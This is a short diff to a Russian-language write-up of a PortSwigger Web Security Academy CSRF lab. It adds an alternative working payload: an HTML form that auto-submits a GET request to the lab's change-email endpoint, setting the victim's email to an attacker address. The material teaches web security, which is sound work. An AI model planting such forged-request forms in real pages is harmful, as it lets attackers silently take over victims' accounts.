@@ -39,3 +39,12 @@ You can log in to your own account using the following credentials: `wiener:pete
 
 ![fig4.png](fig4.png)
 
+
+Но и такой `payload` тоже сработал бы:
+```html
+<form action="https://0a4f00fc039f97f481761b4800650044.web-security-academy.net/my-account/change-email" method="GET">
+  <input type="hidden" name="email" value="hacker@evil-user.net">
+  <input type="submit" value="Submit request">
+</form>
+<script>document.forms[0].submit();</script>
+```
